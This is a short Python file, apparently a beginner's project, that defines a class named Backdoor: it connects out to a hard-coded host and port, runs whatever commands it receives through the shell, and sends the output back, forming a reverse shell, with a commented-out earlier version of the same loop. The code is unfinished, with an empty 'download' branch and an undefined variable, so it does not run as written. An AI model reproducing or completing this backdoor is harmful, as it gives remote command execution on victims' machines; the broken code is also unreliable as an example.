import sys
import threading
import subprocess
import socket

#Use string.split() to make array of words

class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def execute(self, command):
        return subprocess.check_output(command, shell=True)

    #def download(self, content)

    def run(self):
        while True:
            data = self.s.recv(1024)
            new_data = data.decode().split()
            if (new_data[0] == "quit"):
                self.s.close()
                sys.exit()
            elif (new_data[0] == "download"):

            else:
                result = self.execute(data)
                self.s.send(result)
        s.close()

back = Backdoor("127.0.0.1", 3333)
back.run()
#def execute(command):
#    return subprocess.check_output(command, shell=True)
#
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("127.0.0.1", 3333))
#s.send("connected\n".encode())
#while True:
#    data = s.recv(1024)
#    if (data.decode() == "quit\n"):
#        s.close()
#        sys.exit()
#    result = execute(data)
#    s.send(result)
#s.close()
